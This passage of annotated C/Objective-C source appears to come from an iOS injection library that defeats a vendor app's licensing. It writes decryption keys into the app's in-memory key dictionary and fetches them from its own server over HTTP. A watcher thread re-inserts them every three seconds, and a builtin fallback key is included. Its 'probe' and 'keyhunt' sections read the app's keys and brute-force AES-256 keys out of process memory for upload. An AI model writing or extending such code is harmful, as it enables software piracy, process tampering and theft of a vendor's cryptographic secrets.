///     版本一变（020909 -> 030000）就得改源码 + 重跑 CI + 重新部署；
///     现在只要云端密钥库补上对应版本，设备自己就能跟上。
///
///   ★ v6.5：语义从「为空才写」升级为**「按版本幂等 + 合并」**：
///     - 槽位已含当前本地版本的键 → 纯 C 快路径直接返回（不碰 ObjC）
///     - 版本与上次注入的不同（官方下包落盘）→ 取新版本密钥，**合并**进原字典
///   由 bootstrap 调一次；此后由 bs_verwatch（3s）持续复查。
static int bs_verhex_to_bytes(const char *hex, unsigned char out[3]) {
    if (!hex || strlen(hex) != 6) return 0;
    for (int i = 0; i < 3; i++) {
        int hi = (unsigned char)hex[2 * i];
        int lo = (unsigned char)hex[2 * i + 1];
        int a = (hi >= '0' && hi <= '9') ? hi - '0' :
                (hi >= 'a' && hi <= 'f') ? hi - 'a' + 10 :
                (hi >= 'A' && hi <= 'F') ? hi - 'A' + 10 : -1;
        int b = (lo >= '0' && lo <= '9') ? lo - '0' :
                (lo >= 'a' && lo <= 'f') ? lo - 'a' + 10 :
                (lo >= 'A' && lo <= 'F') ? lo - 'A' + 10 : -1;
        if (a < 0 || b < 0) return 0;
        out[i] = (unsigned char)((a << 4) | b);
    }
    return 1;
}

/// ★ v6.5：字典里是否已有该版本键。**必须在带 autoreleasepool 的上下文调用。**
static int bs_mh_has(void *dictptr, const unsigned char kk[3]) {
    if (!dictptr) return 0;
    @autoreleasepool {
        NSDictionary *d = (NSDictionary *)dictptr;
        NSData *k = [NSData dataWithBytes:kk length:3];
        return [d objectForKey:k] ? 1 : 0;
    }
}

/// ★ v6.14：字典条目数（仅用于诊断日志；-1 = 槽位为空）。
///   现场靠这个数字判断产品有没有把关我们的字典换掉（n 变 0/变小 = 被替换过）。
static long bs_mh_count(void *dictptr) {
    if (!dictptr) return -1;
    @autoreleasepool {
        NSDictionary *d = (NSDictionary *)dictptr;
        return (long)[d count];
    }
}

static void bs_inject_mh(uintptr_t base) {
    void **slot = (void **)(base + OFF_MH);

    char verhex[8] = {0};
    int have_ver = bs_read_beta_ver(verhex, sizeof(verhex));

    unsigned char vkey[3] = {0};
    int key_from_ver = have_ver && bs_verhex_to_bytes(verhex, vkey);

    unsigned char kk[3];
    unsigned char vv[32];
    int ok = 0;
    int from_cache = 0;

    if (have_ver && key_from_ver) {
        // ★★★ v6.14：判据反转 —— **先确认键在不在字典里**，再谈版本号。
        //   产品 `_set_script_mushroom_head` 是整表替换（免卡密机照样会调），
        //   键会被冲掉；同版本也必须补回去，否则哨兵永远修不回来。
        int present = (*slot != NULL) && bs_mh_has(*slot, vkey);
        if (present) {
            if (strcmp(verhex, g_mh_ver)) {
                strncpy(g_mh_ver, verhex, sizeof(g_mh_ver) - 1);
                g_mh_ver[sizeof(g_mh_ver) - 1] = 0;
            }
            return;
        }
        // 键不在字典里：① 版本真的变了（官方落新包）② 字典被产品整表替换/清空
        if (!strcmp(verhex, g_mh_miss) && ++g_mh_try < VERWATCH_RETRY_EVERY) return;
        g_mh_try = 0;

        if (g_mh_cached && !strcmp(verhex, g_mh_ver)) {
            // ★ v6.14 离线快路径：版本没变、密钥有缓存 → 纯本地合并，不发 HTTP
            memcpy(kk, g_mh_kk, sizeof(kk));
            memcpy(vv, g_mh_vv, sizeof(vv));
            ok = 1;
            from_cache = 1;
            bs_log("[mh] key %s missing in dict (n=%ld) -> re-inject from cache",
                   verhex, bs_mh_count(*slot));
        } else {
            bs_log("[mh] ver changed -> %s (was '%s'), re-inject",
                   verhex, g_mh_ver[0] ? g_mh_ver : "(none)");
        }
    } else if (!have_ver && *slot != NULL) {
        return;   // 读不到版本、槽位又已有内容 → 别乱动
    }

    // ★ v6.14：ok 已在上面（缓存命中）或下面（云端取键）置位；
    //   缓存命中时**完全跳过 HTTP**。
    if (!ok && have_ver) {
        char ip[128] = {0};
        if (bs_get_host_c(ip, sizeof(ip))) {
            char url[512];
            if (g_token[0])
                snprintf(url, sizeof(url), "http://%s:%d/key?prj=%s&ver=%s&key=%s",
                         ip, g_port, BS_PRJ, verhex, g_token);
            else
                snprintf(url, sizeof(url), "http://%s:%d/key?prj=%s&ver=%s",
                         ip, g_port, BS_PRJ, verhex);

            size_t n = 0;
            unsigned char *b = bs_http_get_c(url, &n);
            // ★ v6.5：**校验回包版本号**与请求一致（35B 且首 3 字节 == 请求版本），
            //   否则视为没拿到该版本的密钥（服务器可能回了别的版本 / 占位内容）
            if (b && n == 35 && key_from_ver && !memcmp(b, vkey, 3)) {
                memcpy(kk, b, 3);
                memcpy(vv, b + 3, 32);
                ok = 1;
                bs_log("[mh] cloud key OK ver=%s (%02x%02x%02x)", verhex,
                       kk[0], kk[1], kk[2]);
            } else {
                bs_log("[mh] cloud key MISS ver=%s n=%lu -> %s",
                       verhex, (unsigned long)n,
                       *slot != NULL ? "hold old, retry later" : "fallback");
            }
            if (b) free(b);
        } else {
            bs_log("[mh] no host -> %s", *slot != NULL ? "hold old" : "fallback");
        }
    } else if (!ok) {
        bs_log("[mh] beta.so ver unknown -> fallback");
    }

    if (!ok) {
        if (*slot != NULL) {
            // ★ v6.5：旧版本密钥已在手，新版本密钥云端还没上架 → 什么都不动
            //   （绝不把旧键冲掉，也绝不假装已注入新版本），记下版本号供节流，回头再试。
            if (have_ver && strcmp(verhex, g_mh_miss)) {
                strncpy(g_mh_miss, verhex, sizeof(g_mh_miss) - 1);
                g_mh_miss[sizeof(g_mh_miss) - 1] = 0;
            }
            return;
        }
        memcpy(kk, kKey, sizeof(kk));
        memcpy(vv, kVal, sizeof(vv));
        bs_log("[mh] using builtin key %02x%02x%02x", kk[0], kk[1], kk[2]);
    }

    @autoreleasepool {
        NSData *key = [NSData dataWithBytes:kk length:sizeof(kk)];
        NSData *val = [NSData dataWithBytes:vv length:sizeof(vv)];
        // ★ v6.5：**合并**进原字典（而不是整表替换）—— 免得丢掉 Agent 自己塞的键
        NSMutableDictionary *md;
        if (*slot != NULL) md = [NSMutableDictionary dictionaryWithDictionary:(NSDictionary *)(*slot)];
        else               md = [NSMutableDictionary dictionary];
        if (md) {
            [md setObject:val forKey:key];
            *slot = (void *)CFBridgingRetain(md);   // 永久 +1
            // ★ v6.14：把「版本 + 密钥」缓存进进程内存，供被冲掉时离线秒补
            if (have_ver && ok) {
                memcpy(g_mh_kk, kk, sizeof(g_mh_kk));
                memcpy(g_mh_vv, vv, sizeof(g_mh_vv));
                g_mh_cached = 1;
                strncpy(g_mh_ver, verhex, sizeof(g_mh_ver) - 1);   // 只记「确实注入了该版本密钥」
                g_mh_ver[sizeof(g_mh_ver) - 1] = 0;
                g_mh_miss[0] = 0;
                g_mh_try = 0;
            }
            bs_log("[mh] injected base=%p slot=%p new=%p ver=%s cloud=%d cache=%d n=%lu",
                   (void *)base, (void *)slot, *slot,
                   have_ver ? verhex : "(none)", ok, from_cache, (unsigned long)[md count]);
        } else {
            bs_log("[mh] dict build failed");
        }
    }
}

/// ★★★ v6.15：确保**载荷记录版本**（厂商固定 `020909`）的密钥也在字典里。
///
///   为什么必须单独做：`beta.so` 是**多记录容器**，Agent 在 `_bb_load_snail_module`
///   里**逐条记录**查密钥。记录 0（type=0x00 元数据）的 ver = 项目版本（030001…），
///   记录 1（type=0x01 脚本载荷）的 ver **恒为 020909**。只注头版本 ⇒ 载荷记录无键
///   ⇒ `can not find version key!!` → 中控报「加载运行库出错」。（2.9.9/3.0.0/3.0.1
///   三份文件的载荷记录版本与 32B hash 完全相同，故 020909 是格式版本而非项目版本。）
///
///   顺序：① 字典已有 → 返回（零开销，verwatch 3s 一轮可放心重放）
///         ② 有内存缓存 → 纯本地合并，不发 HTTP
///         ③ 否则 GET /key?prj=&ver=020909 → 校验 35B 且首 3 字节 == 020909 → 缓存
///         ④ 全失败 → 内置 kKey/kVal（与线上 020909 逐字节一致，已验证）
static void bs_ensure_payload_key(uintptr_t base) {
    void **slot = (void **)(base + OFF_MH);

    // ① 已在字典里 → 什么都不做
    if (*slot != NULL && bs_mh_has(*slot, kKey)) return;

    unsigned char kk[3];
    unsigned char vv[32];
    memcpy(kk, kKey, sizeof(kk));

    int ok = 0;

    // ② 内存缓存（此前取到过）→ 离线直接用
    if (g_pay_cached) {
        memcpy(vv, g_pay_vv, sizeof(vv));
        ok = 1;
    }

    // ③ 云端取载荷版本密钥
    if (!ok) {
        if (!strcmp("020909", g_pay_miss) && ++g_pay_try < VERWATCH_RETRY_EVERY) return;
        g_pay_try = 0;

        char ip[128] = {0};
        if (bs_get_host_c(ip, sizeof(ip))) {
            char url[512];
            if (g_token[0])
                snprintf(url, sizeof(url), "http://%s:%d/key?prj=%s&ver=020909&key=%s",
                         ip, g_port, BS_PRJ, g_token);
            else
                snprintf(url, sizeof(url), "http://%s:%d/key?prj=%s&ver=020909",
                         ip, g_port, BS_PRJ);

            size_t n = 0;
            unsigned char *b = bs_http_get_c(url, &n);
            if (b && n == 35 && !memcmp(b, kk, 3)) {
                memcpy(vv, b + 3, 32);
                ok = 1;
                bs_log("[mh] payload cloud key OK ver=020909");
            } else {
                bs_log("[mh] payload cloud key MISS ver=020909 n=%lu -> %s",
                       (unsigned long)n, "use builtin");
                if (strcmp(g_pay_miss, "020909")) {
                    strncpy(g_pay_miss, "020909", sizeof(g_pay_miss) - 1);
                    g_pay_miss[sizeof(g_pay_miss) - 1] = 0;
                }
            }
            if (b) free(b);
        }
    }

    // ④ 兜底：内置
    if (!ok) memcpy(vv, kVal, sizeof(vv));

    // 缓存（内置与云端都算有效值，后续离线秒补）
    memcpy(g_pay_vv, vv, sizeof(g_pay_vv));
    g_pay_cached = 1;

    @autoreleasepool {
        NSMutableDictionary *md;
        if (*slot != NULL) md = [NSMutableDictionary dictionaryWithDictionary:(NSDictionary *)(*slot)];
        else               md = [NSMutableDictionary dictionary];
        if (!md) { bs_log("[mh] payload dict build failed"); return; }
        NSData *key = [NSData dataWithBytes:kk length:sizeof(kk)];
        if ([md objectForKey:key] == nil) {
            [md setObject:[NSData dataWithBytes:vv length:sizeof(vv)] forKey:key];
            *slot = (void *)CFBridgingRetain(md);
            bs_log("[mh] payload key injected ver=%02x%02x%02x cloud=%d n=%lu",
                   kk[0], kk[1], kk[2], ok, (unsigned long)[md count]);
        }
    }
}

/// ★★★ v6.18：把任意版本键合并进字典（幂等）。须在带 autoreleasepool 的线程调用。
///   返回 1 = 字典已含该键（或本次注入成功）。
static int bs_mh_merge_key(uintptr_t base, const unsigned char kk[3], const unsigned char vv[32]) {
    void **slot = (void **)(base + OFF_MH);
    @autoreleasepool {
        if (*slot != NULL && bs_mh_has(*slot, kk)) return 1;
        NSMutableDictionary *md;
        if (*slot != NULL) md = [NSMutableDictionary dictionaryWithDictionary:(NSDictionary *)(*slot)];
        else               md = [NSMutableDictionary dictionary];
        if (!md) { bs_log("[mh] extra dict build failed"); return 0; }
        NSData *key = [NSData dataWithBytes:kk length:3];
        if ([md objectForKey:key] == nil) {
            [md setObject:[NSData dataWithBytes:vv length:32] forKey:key];
            *slot = (void *)CFBridgingRetain(md);
        }
        return 1;
    }
}

/// ★★★ v6.18：确保「头版本 + 020909 之外的段版本键」在字典里。
///   ① 字典已有 → 1（零开销） ② 云端 /key 取（35B 且首 3B 匹配才采用）→ 注入 → 1
///   ③ 失败 → 记节流（同版本连续 miss 每 VERWATCH_RETRY_EVERY 轮才重试一次）→ 0
///   bypass_throttle=1 供 so_sync 键闸门用（闸门必须拿新鲜结论，不能被节流跳过）。
///   注意：这些版本**没有内置兜底**（kKey/kVal 只覆盖 020909），取不到就是取不到。
static int bs_ensure_extra_key(uintptr_t base, const char *verhex, int bypass_throttle) {
    unsigned char kk[3];
    if (!bs_verhex_to_bytes(verhex, kk)) return 0;

    void **slot = (void **)(base + OFF_MH);
    if (base != 0 && *slot != NULL && bs_mh_has(*slot, kk)) return 1;

    // per-ver 节流（g_base==0 时无字典可查，每次都真取——闸门场景必须新鲜）
    int idx = -1;
    for (int i = 0; i < EK_VERS_MAX; i++) {
        if (g_ek_miss[i][0] == 0) { if (idx < 0) idx = i; continue; }
        if (!strcmp(g_ek_miss[i], verhex)) { idx = i; break; }
    }
    if (idx < 0) idx = 0;
    if (!bypass_throttle && !strcmp(g_ek_miss[idx], verhex) &&
        ++g_ek_try[idx] < VERWATCH_RETRY_EVERY) return 0;
    g_ek_try[idx] = 0;

    char ip[128] = {0};
    if (!bs_get_host_c(ip, sizeof(ip))) {
        bs_log("[mh] extra key %s: no host", verhex);
        return 0;
    }
    char url[512];
    if (g_token[0])
        snprintf(url, sizeof(url), "http://%s:%d/key?prj=%s&ver=%s&key=%s",
                 ip, g_port, BS_PRJ, verhex, g_token);
    else
        snprintf(url, sizeof(url), "http://%s:%d/key?prj=%s&ver=%s",
                 ip, g_port, BS_PRJ, verhex);

    size_t n = 0;
    unsigned char *b = bs_http_get_c(url, &n);
    if (b && n == 35 && !memcmp(b, kk, 3)) {
        if (base != 0 && !bs_mh_merge_key(base, kk, b + 3)) { free(b); return 0; }
        bs_log("[mh] extra key OK ver=%s (base=%s)", verhex, base != 0 ? "injected" : "cached-offline");
        g_ek_miss[idx][0] = 0; g_ek_try[idx] = 0;
        free(b);
        return 1;
    }
    bs_log("[mh] extra key MISS ver=%s n=%lu%s", verhex, (unsigned long)n,
           bypass_throttle ? " (gate)" : "");
    strncpy(g_ek_miss[idx], verhex, sizeof(g_ek_miss[idx]) - 1);
    g_ek_miss[idx][sizeof(g_ek_miss[idx]) - 1] = 0;
    if (b) free(b);
    return 0;
}

/// ★★★ v6.18：扫 beta.so 段流，收集**全部记录头版本**（去重，最多 maxv 个）。
///   游走规则与 beta_so_parse.py 逐条对齐：
///     type=0  头 44B：usz@36 csz@40，next = +44+csz（不对齐）
///     type=2  头 42B：nl@36 cl@40，  next = +42+align16(nl+cl)
///     type=1  头 46B：nl@36 cl@40 ci@42，next = +46+align16(ci)
///   任何异常（未知类型 / 尺寸越界 / 回绕）即停 —— 返回已扫到的版本数。
///   纯内存只读头 46B 窗口，不解密，1.2MB 文件微秒级。
static int bs_scan_so_vers(const unsigned char *b, size_t n,
                           unsigned char out[][3], int maxv) {
    int cnt = 0;
    size_t off = 0;
    while (off + 46 <= n && cnt < maxv) {
        unsigned char t = b[off];
        int known = 0;
        for (int i = 0; i < cnt; i++)
            if (!memcmp(out[i], b + off + 1, 3)) { known = 1; break; }
        if (!known) { memcpy(out[cnt], b + off + 1, 3); cnt++; }

        unsigned nl = (unsigned)b[off + 36] | ((unsigned)b[off + 37] << 8);
        unsigned cl = (unsigned)b[off + 38] | ((unsigned)b[off + 39] << 8) |
                      ((unsigned)b[off + 40] << 16) | ((unsigned)b[off + 41] << 24);
        size_t next = 0;
        if (t == 0) {
            unsigned csz = (unsigned)b[off + 40] | ((unsigned)b[off + 41] << 8) |
                           ((unsigned)b[off + 42] << 16) | ((unsigned)b[off + 43] << 24);
            next = off + 44 + csz;
        } else if (t == 2) {
            if (nl >= 4096 || cl == 0 || cl > 30000000u) break;
            next = off + 42 + (((size_t)nl + cl + 15) / 16 * 16);
        } else if (t == 1) {
            unsigned ci = (unsigned)b[off + 42] | ((unsigned)b[off + 43] << 8) |
                          ((unsigned)b[off + 44] << 16) | ((unsigned)b[off + 45] << 24);
            if (nl >= 4096 || cl == 0 || cl > 30000000u || ci == 0 || ci > 30000000u) break;
            next = off + 46 + (((size_t)ci + 15) / 16 * 16);
        } else {
            break;
        }
        if (next <= off || next > n) break;
        off = next;
    }
    return cnt;
}

/// ★ v6.18：verwatch 用的「盘上 beta.so 版本集合」刷新器。
///   (size, mtime) 都没变 → 沿用上次扫描结果（0 开销）；变了 → 重读重扫。
///   返回当前集合里的版本个数（失败/文件不存在 → 0）。
static int bs_read_file(const char *path, unsigned char **out, size_t *outlen);   // 定义在 probe 段（v6.4）
static int bs_refresh_so_vers(void) {
    struct stat st;
    if (stat(DATA_DIR "/beta.so", &st) != 0) {
        // ★ v6.38：文件暂时不可读 → **保留上次扫描到的版本集合**，不要清零。
        //   清零的后果（10-23 1055/1056 实锤）：verwatch 每 3s 扫一次都拿 0，
        //   于是它一把版本键都不补；脚本一重启，App 解不开容器就直接
        //   `load snail module failed` → 中控「加载运行库出错」。
        //   保留旧集合至少能让字典里已有的键继续常驻，不至于一停电全丢。
        if (g_ek_nver > 0) return g_ek_nver;
        return 0;
    }
    long long mt = (long long)st.st_mtimespec.tv_sec;
    if ((off_t)st.st_size == g_ek_scan_size && mt == g_ek_scan_mtime && g_ek_scan_size >= 0)
        return g_ek_nver;                       // 文件没变：沿用缓存
    g_ek_scan_size = (off_t)st.st_size;
    g_ek_scan_mtime = mt;
    g_ek_nver = 0;
    if (st.st_size < 46 || st.st_size > SO_MAX_BYTES) return 0;
    unsigned char *buf = NULL;
    size_t bn = 0;
    if (!bs_read_file(DATA_DIR "/beta.so", &buf, &bn)) return 0;
    int nv = bs_scan_so_vers(buf, bn, g_ek_vers, EK_VERS_MAX);
    free(buf);
    g_ek_nver = nv;
    if (nv > 0) {
        char lst[16 * 8] = {0};
        for (int i = 0; i < nv; i++) {
            char one[10];
            snprintf(one, sizeof(one), "%s%02x%02x%02x", i ? "," : "",
                     g_ek_vers[i][0], g_ek_vers[i][1], g_ek_vers[i][2]);
            strncat(lst, one, sizeof(lst) - strlen(lst) - 1);
        }
        bs_log("[mh] scan beta.so (%ld B) -> %d ver(s): %s",
               (long)bn, nv, lst);
    }
    return nv;
}

/// ★ v6.5：版本哨兵 —— 每 3s 纯 C 读 beta.so 头 4B（微秒级开销）。
///   官方把新包落盘后，这里 3s 内就发现 → /key 取新版本密钥 → 合并注入，
///   **早于** Agent 约 12s 后的脚本重载 ⇒ 免卡密机跟版不再需要重开 App。
static void *bs_verwatch(void *arg) {
    uintptr_t base = (uintptr_t)arg;
    bs_log("[ver] verwatch start (tick=%ds)", VERWATCH_TICK_SECS);
    for (;;) {
        sleep(VERWATCH_TICK_SECS);
        @autoreleasepool {
            bs_inject_mh(base);
            bs_ensure_payload_key(base);   // ★ v6.15：载荷记录版本（020909）也必须常驻
            // ★ v6.18：多版本键常驻 —— 盘上 beta.so 每个段版本都要有键。
            //   3.0.5 实锤：lua 记录带 030002~030005 各版本，缺任何一把都会
            //   `can not find version key!!` → load snail module failed。
            int nv = bs_refresh_so_vers();
            for (int i = 0; i < nv; i++) {
                char vh[8];
                snprintf(vh, sizeof(vh), "%02x%02x%02x",
                         g_ek_vers[i][0], g_ek_vers[i][1], g_ek_vers[i][2]);
                bs_ensure_extra_key(base, vh, 0);
            }
        }
    }
    return NULL;
}

// ================================================================
// ★★★ v6.4：probe 模式（真卡机只读雷达）
//
//   与 unlock 模式共用一个二进制，靠 bs_pull.conf 的 `mode=probe` 切换。
//   probe 只读不写：读版本 → 读密钥字典 → POST 上报；绝不注入 / 心跳 / 拉模块。
// ================================================================

/// 读整个文件到 malloc 缓冲（调用方 free）。成功返回 1，失败返回 0。
static int bs_read_file(const char *path, unsigned char **out, size_t *outlen) {
    *out = NULL;
    *outlen = 0;
    int fd = open(path, O_RDONLY);
    if (fd < 0) return 0;
    struct stat st;
    if (fstat(fd, &st) != 0 || st.st_size <= 0) { close(fd); return 0; }
    size_t n = (size_t)st.st_size;
    unsigned char *b = (unsigned char *)malloc(n);
    if (!b) { close(fd); return 0; }
    size_t off = 0;
    while (off < n) {
        ssize_t r = read(fd, b + off, n - off);
        if (r <= 0) break;
        off += (size_t)r;
    }
    close(fd);
    if (off != n) { free(b); return 0; }
    *out = b;
    *outlen = n;
    return 1;
}

/// 6 位 hex -> 3 字节（probe 内部用，不依赖 sscanf）
static void bs_hex3(const char *h, unsigned char *o) {
    for (int i = 0; i < 3; i++) {
        char a = h[i * 2], b = h[i * 2 + 1];
        int hi = (a <= '9') ? (a - '0') : ((a | 0x20) - 'a' + 10);
        int lo = (b <= '9') ? (b - '0') : ((b | 0x20) - 'a' + 10);
        o[i] = (unsigned char)(((hi & 0xf) << 4) | (lo & 0xf));
    }
}

/// 把 _g_script_mushroom_head 字典快照成纯 C 数组（[3B ver][32B val] × N）。
///   ★ 只在这里碰 ObjC 字典（调用点带 @autoreleasepool），后续线程只读纯 C 副本，
///     避免在裸 pthread 上反复走 objc runtime。
///   ★ 允许反复调用：App 可能在启动若干秒后才从卡密服务器拿到密钥。
static void bs_mh_snapshot(uintptr_t base) {
    g_mh_n = 0;
    int ok = 0;
    @autoreleasepool {
        id raw = *(id *)(base + OFF_MH);
        if (raw && [raw isKindOfClass:[NSDictionary class]]) {
            NSDictionary *d = (NSDictionary *)raw;
            [d enumerateKeysAndObjectsUsingBlock:^(id k, id v, BOOL *stop) {
                if (![k isKindOfClass:[NSData class]]) return;
                if (![v isKindOfClass:[NSData class]]) return;
                NSData *kd = (NSData *)k;
                NSData *vd = (NSData *)v;
                if (kd.length != 3 || vd.length != 32) return;
                if (g_mh_n >= MH_SNAP_MAX) return;
                memcpy(g_mh_snap[g_mh_n], kd.bytes, 3);
                memcpy(g_mh_snap[g_mh_n] + 3, vd.bytes, 32);
                g_mh_n++;
            }];
            ok = 1;
        }
    }
    if (g_mh_n > 0) {
        char line[160];
        int p = snprintf(line, sizeof(line), "[probe] mh snapshot n=%d:", g_mh_n);
        for (int i = 0; i < g_mh_n && p < (int)sizeof(line) - 12; i++)
            p += snprintf(line + p, sizeof(line) - p, " %02x%02x%02x",
                          g_mh_snap[i][0], g_mh_snap[i][1], g_mh_snap[i][2]);
        bs_log("%s", line);
    } else {
        bs_log("[probe] mh snapshot empty (dict=%s)", ok ? "present" : "nil");
    }
}

// ================================================================
// ★★★ v6.23q：keyhunt —— 密钥字典缺失时的进程内存暴力找回
//
//   背景：厂商 3.0.9 起改了密钥送达方式，解密密钥不再进
//   _g_script_mushroom_head 字典 → probe 每拍 "not in dict yet"，
//   云端永远等不到 030009（.71 实测：脚本在跑 3.0.9、字典仍 n=8）。
//   但密钥在脚本解密那一刻必经本进程内存。做法：
//     1) 读盘上 beta.so，解析段链，取【ver==目标版本】的 type=1 段
//        （★ 段链混版本：030008 包里 400 段是 020909 的，必须按段头 ver 过滤）
//     2) 遍历本进程可读内存（mach_vm_region + mach_vm_read_overwrite，
//        4MB 分块），把每个候选 32B 窗口当 AES-256-ECB 密钥试解：
//          粗筛：首块解密 == 合法 zlib 头（0x78 且 (CMF<<8|FLG)%31==0）
//          精验：整段解密 + libcompression 原始 deflate == nl+cl 且 name 可打印
//     3) 命中 → 注入 g_mh_snap，让常规 BSPR 上报链路照跑 → 云端入库
//   AES 纯 C 实现（表全部运行期生成，无魔法常量），先过 FIPS-197 自检，
//   自检失败或 libcompression 不可用则 keyhunt 自动禁用（不影响 probe 其余功能）。
// ================================================================

#define KH_RK_WORDS 60                    // AES-256 轮密钥字数 (Nk=8, Nr=14)

static unsigned char kh_sbox[256], kh_isbox[256];
static unsigned char kh_m9[256], kh_mb[256], kh_md[256], kh_me[256];
static int kh_ready = 0;
static unsigned char kh_chunk[1 << 22];   // 4MB 扫描缓冲（静态区，不占栈）

static unsigned char kh_xt(unsigned char a) {
    return (unsigned char)((a << 1) ^ ((a & 0x80) ? 0x1b : 0));
}
static unsigned char kh_gmul(unsigned char a, unsigned char b) {
    unsigned char p = 0;
    while (b) { if (b & 1) p ^= a; a = kh_xt(a); b >>= 1; }
    return p;
}
/// 运行期生成 S 盒（乘逆+仿射）与 InvMixColumns 乘法表，零魔法常量。
static void kh_init(void) {
    if (kh_ready) return;
    for (int i = 0; i < 256; i++) {
        unsigned char inv = 0;
        if (i) {
            for (int j = 1; j < 256; j++)
                if (kh_gmul((unsigned char)i, (unsigned char)j) == 1) { inv = (unsigned char)j; break; }
        }
        unsigned char x = inv, s = inv;
        for (int k = 0; k < 4; k++) { x = (unsigned char)((x << 1) | (x >> 7)); s ^= x; }
        kh_sbox[i] = (unsigned char)(s ^ 0x63);
    }
    for (int i = 0; i < 256; i++) kh_isbox[kh_sbox[i]] = (unsigned char)i;
    for (int i = 0; i < 256; i++) {
        kh_m9[i] = kh_gmul((unsigned char)i, 0x09);
        kh_mb[i] = kh_gmul((unsigned char)i, 0x0b);
        kh_md[i] = kh_gmul((unsigned char)i, 0x0d);
        kh_me[i] = kh_gmul((unsigned char)i, 0x0e);
    }
    kh_ready = 1;
}

static void kh_expand(const unsigned char *key, unsigned int rk[KH_RK_WORDS]) {
    static const unsigned int rcon[7] = { 0x01000000u, 0x02000000u, 0x04000000u,
        0x08000000u, 0x10000000u, 0x20000000u, 0x40000000u };
    for (int i = 0; i < 8; i++)
        rk[i] = ((unsigned)key[4*i] << 24) | ((unsigned)key[4*i+1] << 16) |
                ((unsigned)key[4*i+2] << 8) | (unsigned)key[4*i+3];
    for (int i = 8; i < KH_RK_WORDS; i++) {
        unsigned t = rk[i-1];
        if (i % 8 == 0) {
            t = (t << 8) | (t >> 24);                    // RotWord
            t = ((unsigned)kh_sbox[(t >> 24) & 0xff] << 24) |
                ((unsigned)kh_sbox[(t >> 16) & 0xff] << 16) |
                ((unsigned)kh_sbox[(t >> 8) & 0xff] << 8) |
                (unsigned)kh_sbox[t & 0xff];             // SubWord
            t ^= rcon[i/8 - 1];
        } else if (i % 8 == 4) {
            t = ((unsigned)kh_sbox[(t >> 24) & 0xff] << 24) |
                ((unsigned)kh_sbox[(t >> 16) & 0xff] << 16) |
                ((unsigned)kh_sbox[(t >> 8) & 0xff] << 8) |
                (unsigned)kh_sbox[t & 0xff];
        }
        rk[i] = rk[i-8] ^ t;
    }
}

/// 直列逆密码（FIPS-197 InvCipher）：初始 AddRoundKey(Nr)，末轮无 InvMixColumns。
static void kh_dec_block(const unsigned int rk[KH_RK_WORDS],
                         const unsigned char in[16], unsigned char out[16]) {
    unsigned char s[16], t[16];
    for (int c = 0; c < 4; c++) {
        unsigned w = rk[56 + c];
        s[4*c+0] = in[4*c+0] ^ (unsigned char)(w >> 24);
        s[4*c+1] = in[4*c+1] ^ (unsigned char)(w >> 16);
        s[4*c+2] = in[4*c+2] ^ (unsigned char)(w >> 8);
        s[4*c+3] = in[4*c+3] ^ (unsigned char)w;
    }
    for (int r = 13; r >= 1; r--) {
        for (int c = 0; c < 4; c++)                       // InvShiftRows + InvSubBytes
            for (int j = 0; j < 4; j++)
                t[4*c+j] = kh_isbox[ s[4*((c + 4 - j) & 3) + j] ];
        for (int c = 0; c < 4; c++) {                     // AddRoundKey(r)
            unsigned w = rk[r*4 + c];
            t[4*c+0] ^= (unsigned char)(w >> 24);
            t[4*c+1] ^= (unsigned char)(w >> 16);
            t[4*c+2] ^= (unsigned char)(w >> 8);
            t[4*c+3] ^= (unsigned char)w;
        }
        for (int c = 0; c < 4; c++) {                     // InvMixColumns
            unsigned char a0 = t[4*c], a1 = t[4*c+1], a2 = t[4*c+2], a3 = t[4*c+3];
            s[4*c+0] = (unsigned char)(kh_me[a0] ^ kh_mb[a1] ^ kh_md[a2] ^ kh_m9[a3]);
            s[4*c+1] = (unsigned char)(kh_m9[a0] ^ kh_me[a1] ^ kh_mb[a2] ^ kh_md[a3]);
            s[4*c+2] = (unsigned char)(kh_md[a0] ^ kh_m9[a1] ^ kh_me[a2] ^ kh_mb[a3]);
            s[4*c+3] = (unsigned char)(kh_mb[a0] ^ kh_md[a1] ^ kh_m9[a2] ^ kh_me[a3]);
        }
    }
    for (int c = 0; c < 4; c++)                           // 末轮：InvShiftRows + InvSubBytes
        for (int j = 0; j < 4; j++)
            t[4*c+j] = kh_isbox[ s[4*((c + 4 - j) & 3) + j] ];
    for (int c = 0; c < 4; c++) {                         // AddRoundKey(0)
        unsigned w = rk[c];
        out[4*c+0] = (unsigned char)(t[4*c+0] ^ (unsigned char)(w >> 24));
        out[4*c+1] = (unsigned char)(t[4*c+1] ^ (unsigned char)(w >> 16));
        out[4*c+2] = (unsigned char)(t[4*c+2] ^ (unsigned char)(w >> 8));
        out[4*c+3] = (unsigned char)(t[4*c+3] ^ (unsigned char)w);
    }
}

/// FIPS-197 C.3 已知答自检（AES-256）。失败返回 0（keyhunt 禁用）。
static int kh_selftest(void) {
    static const unsigned char k[32] = {
        0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f,
        0x10,0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,0x19,0x1a,0x1b,0x1c,0x1d,0x1e,0x1f };
    static const unsigned char ctv[16] = {
        0x8e,0xa2,0xb7,0xca,0x51,0x67,0x45,0xbf,0xea,0xfc,0x49,0x90,0x4b,0x49,0x60,0x89 };
    static const unsigned char ptv[16] = {
        0x00,0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,0x99,0xaa,0xbb,0xcc,0xdd,0xee,0xff };
    unsigned int rk[KH_RK_WORDS];
    unsigned char out[16];
    kh_expand(k, rk);
    kh_dec_block(rk, ctv, out);
    return memcmp(out, ptv, 16) == 0;
}

/// libcompression 的 compression_decode_buffer 运行期解析（避免改 CI 链接参数）。
typedef size_t (*kh_cdec_t)(unsigned char *, size_t,
                            const unsigned char *, size_t, void *, unsigned int);
static kh_cdec_t kh_cdec = NULL;
static int kh_cdec_tried = 0;
static void kh_load_cdec(void) {
    if (kh_cdec_tried) return;
    kh_cdec_tried = 1;
    void *h = dlopen("/usr/lib/libcompression.dylib", RTLD_LAZY);
    if (!h) h = dlopen("libcompression.dylib", RTLD_LAZY);
    if (!h) h = dlopen("/System/Library/Frameworks/Compression.framework/Compression", RTLD_LAZY);
    if (h) kh_cdec = (kh_cdec_t)dlsym(h, "compression_decode_buffer");
}

/// 段链解析：找【ver==目标】的第一个 type=1 段（★ 混版本包必须按段头 ver 过滤）。
static int kh_pick_ct(const unsigned char *b, size_t n, const unsigned char *ver3,
                      const unsigned char **ct, unsigned int *ci_out,
                      unsigned int *nl_out, unsigned int *cl_out) {
